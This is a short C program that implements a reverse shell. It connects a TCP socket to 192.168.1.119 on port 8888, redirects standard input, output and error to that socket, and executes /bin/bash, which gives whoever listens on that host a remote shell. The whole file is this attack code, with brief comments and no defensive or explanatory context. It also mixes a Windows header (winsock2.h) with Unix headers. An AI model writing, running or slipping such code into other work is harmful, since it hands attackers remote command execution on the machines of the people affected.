#include <stdio.h>
#include <winsock2.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(void){
	int sockt;
	int port = 8888;
	struct sockaddr_in revsockaddr; //defined in the netinet
	
	//socket end point for communication
	// domain: AF_INET 
	// type_connection: two way connection
	// Protocol: 0
	
	sockt = socket(AF_INET, SOCK_STREAM, 0);
	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.119"); //storing address to computer connecting

	connect(sockt, (struct sockaddr *) &revsockaddr,
	sizeof(revsockaddr));

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	char * const argv[] = {"/bin/bash", NULL};
	execve("/bin/bash", argv, NULL);
	return 0;
}
